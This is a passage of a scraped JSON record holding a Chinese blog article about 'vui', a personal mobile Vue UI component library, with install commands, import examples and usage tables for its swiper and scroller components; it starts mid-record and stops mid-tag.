href=\"http://mp.weixin.qq.com/s?__biz=MjM5NzAwNDI4Mg==\u0026amp;mid=2652193324\u0026amp;idx=1\u0026amp;sn=27bd871dba821a11982fff7a085e41d9\u0026amp;chksm=bd0174b98a76fdafbf5515d4304a6ec219755b2293d5aff5c680164daeb9d29e15dadc665213\u0026amp;scene=21#wechat_redirect\" target=\"_blank\"\u003e动手实操：如何用七牛云 API 实现相片地图？\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/7/13/3add43b4469531087c4c587fa79f45a0\" alt=\"\"/\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cbr\u003e\u003cstrong\u003e报名方式：\u003c/strong\u003e有更多有趣的作品分享给大家？扫描上方\u003cstrong\u003e二维码\u003c/strong\u003e和美女队长接头，即可成为【动手实操】系列玩家。\u003c/p\u003e\n","buildTime":"1514451567.9192","__v":0}
{"_id":{"$oid":"5a4b76da2239bd131cd79f48"},"id":"5a430a31f265da43070389d2","author":{"$oid":"5a4b76d92239bd131cd79f29"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/12/27/160961cf99d535d6?w=300\u0026h=300\u0026f=png\u0026s=8570"],"screenShot":null}],"title":"造一个属于自己的 UI 库","meta":{"likeCount":0},"tag":["Vue.js","前端","Web Components"],"comment":[],"shortContent":"1. swiper 2. scroller（下拉刷新上拉加载） 3. search 4. Dialog 弹框 5. Toast 轻提示 6. Picker 选择器 使用 startYear，endYear，startDate，endDate，startMinute，endMin…","content":"\u003cp\u003e\u003cstrong\u003e轮子嘛~总得造上一造~\u003c/strong\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e项目介绍\u003c/h2\u003e\n\u003ch3 class=\"heading\"\u003e\u003ca target=\"_blank\" href=\"https://github.com/Brickies/vui\"\u003evui：一个私人的vue ui 组件库（移动端为主）\u003c/a\u003e\u003c/h3\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://www.npmjs.com/package/x-vui\"\u003e\u003c/a\u003e\u003c/p\u003e\u003cfigure\u003e\u003ca target=\"_blank\" href=\"https://www.npmjs.com/package/x-vui\"\u003e\u003cimg alt=\"Version\" src=\"https://img.shields.io/npm/v/x-vui.svg\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/a\u003e\u003c/figure\u003e\u003ca target=\"_blank\" href=\"https://www.npmjs.com/package/x-vui\"\u003e\u003cfigure\u003e\u003cimg alt=\"Downloads\" src=\"https://img.shields.io/npm/dm/x-vui.svg\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003c/a\u003e\u003ca target=\"_blank\" href=\"https://opensource.org/licenses/MIT\"\u003e\u003cfigure\u003e\u003cimg alt=\"License\" src=\"https://img.shields.io/npm/l/x-vui.svg?style=flat\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003c/a\u003e\u003ca target=\"_blank\" href=\"https://travis-ci.org/Brickies/vui\"\u003e\u003cfigure\u003e\u003cimg alt=\"TravisCI\" src=\"https://user-gold-cdn.xitu.io/2017/12/27/16095e47626fdfcb\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003c/a\u003e\u003cp\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eIt's a A personal Vue UI component library .\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 class=\"heading\"\u003e\u003ca target=\"_blank\" href=\"https://brickies.github.io/vui\"\u003e文档官网\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003e进入 PC 端直接是文档界面，想查看 demo 效果直接将浏览器调成手机模式即可，如果喜欢，还请不要吝惜你的 star 哦~~\u003c/strong\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e在线效果预览\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003e请扫描以下二维码\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/27/160961cf99d535d6?w=300\u0026amp;h=300\u0026amp;f=png\u0026amp;s=8570\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e已有组件\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://github.com/Brickies/vui/tree/dev/packages/swiper\"\u003eswiper\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://github.com/Brickies/vui/tree/dev/packages/swipe\"\u003eswipe\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://github.com/Brickies/vui/tree/dev/packages/swipe-item\"\u003eswipe-item\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://github.com/Brickies/vui/tree/dev/packages/scroller\"\u003escroller\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://github.com/Brickies/vui/tree/dev/packages/search\"\u003esearch\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://github.com/Brickies/vui/tree/dev/packages/toast\"\u003etoast\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://github.com/Brickies/vui/tree/dev/packages/dialog\"\u003edialog\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://github.com/Brickies/vui/tree/dev/packages/picker\"\u003epicker\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://github.com/Brickies/vui/tree/dev/packages/select\"\u003eselect\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://github.com/Brickies/vui/tree/dev/packages/switch\"\u003eswitch\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 class=\"heading\"\u003e安装\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs shell\" lang=\"shell\"\u003enpm i x-vui -S\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003e快速开始\u003c/h2\u003e\n\u003ch3 class=\"heading\"\u003e构建项目（配合 vue-cli）\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-comment\"\u003e# 全局安装 vue-cli\u003c/span\u003e\nnpm install --global vue-cli\n\u003cspan class=\"hljs-comment\"\u003e# 创建一个基于 webpack 模板的新项目\u003c/span\u003e\nvue init webpack my-vui-project\n\u003cspan class=\"hljs-comment\"\u003e# 安装依赖，并下载x-vui\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003ecd\u003c/span\u003e my-vui-project\nnpm install \u0026amp;\u0026amp; npm install x-vui\n\u003cspan class=\"hljs-comment\"\u003e# 项目启动 默认端口localhost:8080\u003c/span\u003e\nnpm run dev\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e完整引入\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e Vue \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'vue'\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e vui \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'x-vui'\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'x-vui/lib/vui-css/index.css'\u003c/span\u003e;\n\nVue.use(vui)\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e部分引入\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e Vue \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'vue'\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e {\n  Scroller,\n  Select\n  \u003cspan class=\"hljs-comment\"\u003e// ...\u003c/span\u003e\n} \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'x-vui'\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'x-vui/lib/vui-css/scroller.css'\u003c/span\u003e;\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'x-vui/lib/vui-css/select.css'\u003c/span\u003e;\n\nVue.component(Scroller.name, Scroller)\nVue.component(Select.name, Select)\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e引入插件\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003e注：完整引入了vui，则无需再注册插件\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e Vue \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'vue'\u003c/span\u003e;\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e { \n  $Toast, \n  $Dialog \n  \u003cspan class=\"hljs-comment\"\u003e// ...\u003c/span\u003e\n} \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'x-vui'\u003c/span\u003e;\n\nVue.prototype.$toast = $Toast\nVue.prototype.$dialog = $Dialog\n\u003c/code\u003e\u003c/pre\u003e\u003ch1 class=\"heading\"\u003e组件用法\u003c/h1\u003e\n\u003ch2 class=\"heading\"\u003e1. swiper\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003e目前这里默认为 swiper 轮播图，如果你有特殊需要，也可以使用swipe和swipe-item组合出自己的swiper\u003c/strong\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e基本用法\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003etemplate\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"swiper-page\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ep\u003c/span\u003e\u0026gt;\u003c/span\u003e正常swiper\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ep\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ev-swiper\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003e:items\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e'items'\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003e:styles\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"{height: '200px'}\"\u003c/span\u003e @\u003cspan class=\"hljs-attr\"\u003echange\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"changeHandle\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ev-swiper\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ep\u003c/span\u003e\u0026gt;\u003c/span\u003e缩略swiper\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ep\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ev-swiper\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e'thum'\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003e:items\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e'items'\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003e:styles\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"{height: '240px'}\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ev-swiper\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003etemplate\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"javascript\"\u003e\n\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003edefault\u003c/span\u003e {\n  data () {\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e {\n      \u003cspan class=\"hljs-attr\"\u003eitems\u003c/span\u003e: [\n        \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'../assets/beauty_1.png'\u003c/span\u003e),\n        \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'../assets/beauty_2.png'\u003c/span\u003e),\n        \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'../assets/beauty_3.png'\u003c/span\u003e),\n        \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'../assets/beauty_4.png'\u003c/span\u003e),\n        \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'../assets/beauty_5.png'\u003c/span\u003e)\n      ],\n    }\n  },\n  \u003cspan class=\"hljs-attr\"\u003emethods\u003c/span\u003e: {\n    changeHandle (index) {\n      \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(index);\n    }\n  }\n}\n\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003eAttributes\u003c/h3\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e参数\u003c/th\u003e\n\u003cth\u003e说明\u003c/th\u003e\n\u003cth\u003e类型\u003c/th\u003e\n\u003cth\u003e可选值\u003c/th\u003e\n\u003cth\u003e默认值\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003etype\u003c/td\u003e\n\u003ctd\u003eswiper类型\u003c/td\u003e\n\u003ctd\u003estring\u003c/td\u003e\n\u003ctd\u003eswiper(正常)/thum(缩略)\u003c/td\u003e\n\u003ctd\u003eswiper\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eauto\u003c/td\u003e\n\u003ctd\u003e自动播放时长\u003c/td\u003e\n\u003ctd\u003enumber\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e5000\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eitems\u003c/td\u003e\n\u003ctd\u003eswiper展示的列表\u003c/td\u003e\n\u003ctd\u003earray\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e[]\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eshowIndicators\u003c/td\u003e\n\u003ctd\u003e是否展示swiper小圆点\u003c/td\u003e\n\u003ctd\u003eboolean\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003etrue\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003estyles\u003c/td\u003e\n\u003ctd\u003eswiper样式控制\u003c/td\u003e\n\u003ctd\u003eobject\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e{}\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eresetTitle\u003c/td\u003e\n\u003ctd\u003e重置title内容\u003c/td\u003e\n\u003ctd\u003estring\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3 class=\"heading\"\u003eEvents\u003c/h3\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e事件名称\u003c/th\u003e\n\u003cth\u003e说明\u003c/th\u003e\n\u003cth\u003e回调参数\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003echange\u003c/td\u003e\n\u003ctd\u003eswiper滑动回调\u003c/td\u003e\n\u003ctd\u003e当前swiper item索引\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch2 class=\"heading\"\u003e2. scroller（下拉刷新上拉加载）\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003e经常用来做手机端的分页功能，下拉刷新，上拉加载\u003c/strong\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e基本用法\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003etemplate\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"scroller-page\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ev-scroller\u003c/span\u003e\n      \u003cspan class=\"hljs-attr\"\u003e:on-refresh\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"refresh\"\u003c/span\u003e\n      \u003cspan class=\"hljs-attr\"\u003e:on-infinite\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"infinite\"\u003c/span\u003e\n    \u0026gt;\u003c/span\u003e\n      \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eul\u003c/span\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eli\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ev-for\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"(list, index) in lists\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003e:key\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"index\"\u003c/span\u003e\u0026gt;\u003c/span\u003e{{list}}\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eli\u003c/span\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eul\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ev-scroller\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003etemplate\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"javascript\"\u003e\n\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003edefault\u003c/span\u003e {\n  data () {\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e {\n      \u003cspan class=\"hljs-attr\"\u003elen\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e,\n    }\n  },\n  \u003cspan class=\"hljs-attr\"\u003ecomputed\u003c/span\u003e: {\n    lists () {\n      \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e arr = []\n      \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e (\u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e i = \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e; i \u0026lt; \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.len + \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e; i++) {\n        arr.push(\u003cspan class=\"hljs-string\"\u003e'列表'\u003c/span\u003e + i)\n      }\n      \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e arr\n    }\n  },\n  \u003cspan class=\"hljs-attr\"\u003emethods\u003c/span\u003e: {\n    \u003cspan class=\"hljs-comment\"\u003e// 下拉刷新\u003c/span\u003e\n    refresh (done) {\n      setTimeout(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003e()\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n        \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.len = \u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e\n        done()\n      }, \u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e)\n    },\n    \u003cspan class=\"hljs-comment\"\u003e// 上拉加载\u003c/span\u003e\n    infinite (done) {\n      setTimeout(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003e()\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.len \u0026gt;= \u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e) {\n          done(\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e)\n          \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e\n        }\n        \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.len++\n        done()\n      }, \u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e)\n    }\n  }\n}\n\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003eAttributes\u003c/h3\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e参数\u003c/th\u003e\n\u003cth\u003e说明\u003c/th\u003e\n\u003cth\u003e类型\u003c/th\u003e\n\u003cth\u003e可选值\u003c/th\u003e\n\u003cth\u003e默认值\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003eonRefresh\u003c/td\u003e\n\u003ctd\u003e下拉回调\u003c/td\u003e\n\u003ctd\u003efunction\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eonInfinite\u003c/td\u003e\n\u003ctd\u003e上拉回调\u003c/td\u003e\n\u003ctd\u003efunction\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ewidth\u003c/td\u003e\n\u003ctd\u003escroller宽度\u003c/td\u003e\n\u003ctd\u003estring\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e100%\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eheight\u003c/td\u003e\n\u003ctd\u003escroller高度\u003c/td\u003e\n\u003ctd\u003estring\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e100%\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eisLoadMore\u003c/td\u003e\n\u003ctd\u003e是否展示上拉加载\u003c/td\u003e\n\u003ctd\u003eboolean\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003etrue\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003erefreshText\u003c/td\u003e\n\u003ctd\u003e下拉文本内容\u003c/td\u003e\n\u003ctd\u003estring\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e下拉刷新\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003enoDataText\u003c/td\u003e\n\u003ctd\u003e无数据文本\u003c/td\u003e\n\u003ctd\u003estring\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e没有更多数据啦~\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003erefreshLayerColor\u003c/td\u003e\n\u003ctd\u003e下拉文本颜色\u003c/td\u003e\n\u003ctd\u003estring\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e#AAA\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eloadingLayerColor\u003c/td\u003e\n\u003ctd\u003e上拉文本颜色\u003c/td\u003e\n\u003ctd\u003estring\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e#AAA\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eanimating\u003c/td\u003e\n\u003ctd\u003e是否有动画\u003c/td\u003e\n\u003ctd\u003eboolean\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003etrue\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eanimationDuration\u003c/td\u003e\n\u003ctd\u003e动画间隔\u003c/td\u003e\n\u003ctd\u003enumber\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e250\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ebouncing\u003c/td\u003e\n\u003ctd\u003e是否有反弹效果\u003c/td\u003e\n\u003ctd\u003estring\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003etrue\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ecssClass\u003c/td\u003e\n\u003ctd\u003econtent css class\u003c/td\u003e\n\u003ctd\u003estring\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3 class=\"heading\"\u003eEvents\u003c/h3\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e事件名称\u003c/th\u003e\n\u003cth\u003e说明\u003c/th\u003e\n\u003cth\u003e回调参数\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003eonRefresh\u003c/td\u003e\n\u003ctd\u003e下拉回调\u003c/td\u003e\n\u003ctd\u003e里面有个done callback用于结束loading效果\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eonInfinite\u003c/td\u003e\n\u003ctd\u003e上拉回调\u003c/td\u003e\n\u003ctd\u003e里面有个done callback用于结束loading效果\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch2 class=\"heading\"\u003e3. search\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003e常用于手机端搜索关键字，有时候还会进行高亮匹配\u003c/strong\u003e\u003c/p\u003e\n\u003ch3 